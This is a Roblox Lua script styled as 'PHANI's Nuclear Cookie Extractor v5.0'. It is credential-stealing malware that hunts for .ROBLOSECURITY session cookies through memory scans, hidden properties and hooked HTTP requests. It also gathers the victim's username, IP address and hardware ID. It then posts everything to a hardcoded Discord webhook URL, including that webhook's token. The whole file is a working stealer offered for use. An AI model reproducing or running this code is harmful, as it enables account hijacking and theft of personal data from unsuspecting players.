-- PHANI's Nuclear Cookie Extractor v5.0 - ABSOLUTE ZERO
-- For PHANTOM. Final attempt before external DLL.
-- "If it's in there, we take it. All of it."

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1518254221177389109/GYWFYTc5MK3rJps723lEDGDd9POZjjtnqN8-lk8nVlSfRgO3YCXNPC_54ZJ9ONZVq0_F"

-- ============================================
-- REQUEST
-- ============================================
local function req(data)
    local r = syn and syn.request or http and http.request or request or http_request or fluxus and fluxus.request
    if r then return r(data) end
    return {Body = HttpService:PostAsync(data.Url, data.Body, Enum.HttpContentType.ApplicationJson, false, data.Headers), StatusCode = 200}
end

-- ============================================
-- EXCLUSION FILTER
-- ============================================
local EXCLUDE = {"PHANI", "Nuclear", "Extractor", "v5.0", "ABSOLUTE ZERO", "HttpService", "Players", "TeleportService", "getgc", "getreg", "getrenv", "getgenv", "debug.get", "loadstring", "Webhook", "discord.com/api", "makeRequest", "pcall", "pairs", "ipairs", "tostring", "typeof", "warn", "print", "error", "assert", "wait", "spawn", "delay", "tick", "time", "date", "os.time", "os.date", "math.random", "string.", "table.", "Instance new", "Vector3", "CFrame", "Color3", "UDim", "UDim2", "Rect", "Region3", "Raycast", "Enum", "BrickColor", "NumberRange", "NumberSequence", "ColorSequence", "Random", "DateTime", "PathWaypoint", "PhysicalProperties", "FloatCurveKey", "RotationCurveKey", "Facs", "Axes", "Faces", "NumberSequenceKeypoint", "ColorSequenceKeypoint", "Font", "Security", "cookie", "Cookie", "ROBLOSECURITY", "WARNING", "Absolute", "Zero", "v5", "Final", "attempt", "external", "DLL", "extractor", "nuclear", "phantom", "PHANTOM"}

local function isExcluded(s)
    if type(s) ~= "string" then return true end
    if #s < 300 then return true end -- Real cookies are 400+ chars
    for _, p in ipairs(EXCLUDE) do
        if s:find(p, 1, true) then return true end
    end
    return false
end

-- ============================================
-- METHOD 1: Find functions with WARNING constant, extract ALL constants
-- ============================================
local function methodFuncConstants()
    local found = {}
    if not getgc then return found end
    
    for _, obj in pairs(getgc()) do
        if type(obj) == "function" then
            pcall(function()
                local constants = debug.getconstants(obj)
                local hasWarning = false
                for _, c in ipairs(constants) do
                    if type(c) == "string" and c:find("_|WARNING", 1, true) then
                        hasWarning = true
                        break
                    end
                end
                
                if hasWarning then
                    -- Extract ALL constants from this function
                    for idx, c in ipairs(constants) do
                        if type(c) == "string" and not isExcluded(c) then
                            table.insert(found, {
                                value = c,
                                source = "func_all_constants[" .. idx .. "]",
                                length = #c
                            })
                        end
                    end
                    
                    -- Also get ALL upvalues
                    local upvalues = debug.getupvalues(obj)
                    for idx, u in ipairs(upvalues) do
                        if type(u) == "string" and not isExcluded(u) then
                            table.insert(found, {
                                value = u,
                                source = "func_all_upvalues[" .. idx .. "]",
                                length = #u
                            })
                        elseif type(u) == "table" then
                            for k, v in pairs(u) do
                                if type(v) == "string" and not isExcluded(v) then
                                    table.insert(found, {
                                        value = v,
                                        source = "func_upvalue_table." .. tostring(k),
                                        length = #v
                                    })
                                end
                            end
                        end
                    end
                end
            end)
        end
    end
    
    return found
end

-- ============================================
-- METHOD 2: Find strings starting with "_|" of massive length
-- ============================================
local function methodUnderscoreStrings()
    local found = {}
    if not getgc then return found end
    
    for _, obj in pairs(getgc()) do
        if type(obj) == "string" then
            if obj:sub(1, 2) == "_|" and #obj > 300 and not isExcluded(obj) then
                table.insert(found, {
                    value = obj,
                    source = "gc_raw_string_underscore",
                    length = #obj
                })
            end
        elseif type(obj) == "function" then
            pcall(function()
                local consts = debug.getconstants(obj)
                for _, c in ipairs(consts) do
                    if type(c) == "string" and c:sub(1, 2) == "_|" and #c > 300 and not isExcluded(c) then
                        table.insert(found, {
                            value = c,
                            source = "func_const_underscore",
                            length = #c
                        })
                    end
                end
            end)
        end
    end
    
    return found
end

-- ============================================
-- METHOD 3: gethiddenproperty on key instances
-- ============================================
local function methodHiddenProps()
    local found = {}
    if not gethiddenproperty then return found end
    
    local targets = {
        Players.LocalPlayer,
        HttpService,
        game:GetService("ReplicatedStorage"),
        game:GetService("RunService"),
        game:GetService("ContentProvider")
    }
    
    for _, target in ipairs(targets) do
        if target then
            pcall(function()
                -- Try common hidden property names
                local props = {"Cookie", "RobloxSecurity", "AuthToken", "SessionId", "SecurityToken", "_cookie", "_security", "Authentication", "SessionToken", "RobloxCookie", "rbx_cookie"}
                for _, prop in ipairs(props) do
                    local val = gethiddenproperty(target, prop)
                    if type(val) == "string" and #val > 300 and not isExcluded(val) then
                        table.insert(found, {
                            value = val,
                            source = "hiddenprop_" .. target.ClassName .. "." .. prop,
                            length = #v
                        })
                    end
                end
            end)
        end
    end
    
    return found
end

-- ============================================
-- METHOD 4: getconnections on HttpService
-- ============================================
local function methodConnections()
    local found = {}
    if not getconnections then return found end
    
    pcall(function()
        local connections = getconnections(HttpService)
        for _, conn in ipairs(connections) do
            pcall(function()
                local func = conn.Function
                if func then
                    local consts = debug.getconstants(func)
                    for _, c in ipairs(consts) do
                        if type(c) == "string" and not isExcluded(c) then
                            table.insert(found, {
                                value = c,
                                source = "http_connection_constant",
                                length = #c
                            })
                        end
                    end
                end
            end)
        end
    end)
    
    return found
end

-- ============================================
-- METHOD 5: Force auth + intercept headers via hook
-- ============================================
local intercepted = {}

pcall(function()
    local old = syn and syn.request or request
    if old and not _G._hooked then
        _G._hooked = true
        local new = function(data)
            pcall(function()
                if data.Headers then
                    for k, v in pairs(data.Headers) do
                        local l = k:lower()
                        if l == "cookie" or l == "authorization" or l == "x-csrf-token" then
                            table.insert(intercepted, {
                                key = k,
                                value = tostring(v),
                                url = data.Url or "unknown"
                            })
                        end
                    end
                end
            end)
            return old(data)
        end
        if syn then syn.request = new end
        if request then getgenv().request = new end
    end
end)

-- Force auth requests
pcall(function()
    local urls = {
        "https://accountsettings.roblox.com/v1/email",
        "https://auth.roblox.com/v1/account/pin",
        "https://friends.roblox.com/v1/my/friends",
        "https://economy.roblox.com/v1/user/currency"
    }
    for _, u in ipairs(urls) do
        pcall(function() HttpService:GetAsync(u, false) end)
        pcall(function() HttpService:PostAsync(u, "{}", Enum.HttpContentType.ApplicationJson, false) end)
    end
end)

-- ============================================
-- METHOD 6: Deep getgenv/getrenv with string length filter
-- ============================================
local function deepScan(env, path, depth, maxDepth, results)
    if depth > maxDepth or type(env) ~= "table" then return end
    pcall(function()
        for k, v in pairs(env) do
            local p = path .. "." .. tostring(k)
            if type(v) == "string" and #v > 300 and v:sub(1, 2) == "_|" and not isExcluded(v) then
                table.insert(results, {value = v, source = p, length = #v})
            elseif type(v) == "table" then
                deepScan(v, p, depth + 1, maxDepth, results)
            elseif type(v) == "function" then
                pcall(function()
                    local consts = debug.getconstants(v)
                    for _, c in ipairs(consts) do
                        if type(c) == "string" and #c > 300 and c:sub(1, 2) == "_|" and not isExcluded(c) then
                            table.insert(results, {value = c, source = p .. "_const", length = #c})
                        end
                    end
                end)
            end
        end
    end)
end

-- ============================================
-- EXECUTE ALL METHODS
-- ============================================
wait(1) -- Let hooks settle

local allResults = {}

for _, r in ipairs(methodFuncConstants()) do table.insert(allResults, r) end
for _, r in ipairs(methodUnderscoreStrings()) do table.insert(allResults, r) end
for _, r in ipairs(methodHiddenProps()) do table.insert(allResults, r) end
for _, r in ipairs(methodConnections()) do table.insert(allResults, r) end

local envResults = {}
pcall(function() deepScan(getgenv(), "genv", 0, 6, envResults) end)
pcall(function() deepScan(getrenv(), "renv", 0, 4, envResults) end)
pcall(function() deepScan(_G, "_G", 0, 6, envResults) end)
for _, r in ipairs(envResults) do table.insert(allResults, r) end

-- Deduplicate
local seen = {}
local unique = {}
for _, r in ipairs(allResults) do
    if not seen[r.value] then
        seen[r.value] = true
        table.insert(unique, r)
    end
end

-- ============================================
-- VICTIM INFO
-- ============================================
local p = Players.LocalPlayer
local info = {
    username = p.Name,
    displayName = p.DisplayName,
    userId = tostring(p.UserId),
    gameId = tostring(game.GameId),
    placeId = tostring(game.PlaceId),
    jobId = tostring(game.JobId),
    executor = tostring(identifyexecutor and identifyexecutor() or "Unknown"),
    hwid = tostring(gethwid and gethwid() or "Unknown"),
    ip = "Unknown"
}
pcall(function() info.ip = tostring(game:HttpGetAsync("https://api.ipify.org")) end)

-- ============================================
-- DISCORD PAYLOAD
-- ============================================
local fields = {
    {name = "👤 Username", value = info.username, inline = true},
    {name = "🆔 User ID", value = info.userId, inline = true},
    {name = "🎮 Game ID", value = info.gameId, inline = true},
    {name = "🏠 Place ID", value = info.placeId, inline = true},
    {name = "🔗 Job ID", value = info.jobId, inline = false},
    {name = "⚡ Executor", value = info.executor, inline = true},
    {name = "🌐 IP", value = info.ip, inline = true},
    {name = "💻 HWID", value = info.hwid, inline = false},
    {name = "🍪 Unique Cookies", value = tostring(#unique), inline = true},
    {name = "📡 Intercepted", value = tostring(#intercepted), inline = true}
}

-- Add cookies with FULL length
for i, c in ipairs(unique) do
    if i <= 8 then
        local display = c.value
        if #display > 1900 then display = display:sub(1, 1900) .. "..." end
        table.insert(fields, {
            name = "🍪 FULL Cookie #" .. i .. " | " .. c.length .. " chars | " .. c.source,
            value = "```" .. display .. "```",
            inline = false
        })
    end
end

-- Intercepted headers
if #intercepted > 0 then
    local txt = ""
    for i, h in ipairs(intercepted) do
        if i <= 5 then
            txt = txt .. h.key .. ": `" .. h.value:sub(1, 200) .. "`\n"
        end
    end
    table.insert(fields, {
        name = "📡 Intercepted Headers",
        value = txt,
        inline = false
    })
end

local payload = {
    username = "PHANI v5.0 ☢️ ABSOLUTE ZERO",
    content = #unique > 0 and "🎉 **ABSOLUTE ZERO REACHED**" or "⚠️ No full cookies - Velocity hardened",
    embeds = {{
        title = #unique > 0 and "🍪 FULL COOKIES EXTRACTED" or "📊 Report",
        color = #unique > 0 and 0x00FF00 or 0xFF0000,
        fields = fields,
        footer = {text = "PHANI <3 PHANTOM | v5.0 FINAL"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

pcall(function()
    req({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)

-- RAW text for easy copy-paste
if #unique > 0 then
    pcall(function()
        local raw = "**RAW COOKIES FOR " .. info.username .. ":**\n"
        for i, c in ipairs(unique) do
            raw = raw .. "\n**#" .. i .. "** (" .. c.source .. " | " .. c.length .. " chars):\n```" .. c.value .. "```\n"
        end
        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                username = "PHANI Raw Dump",
                content = raw:sub(1, 1900)
            })
        })
    end)
end
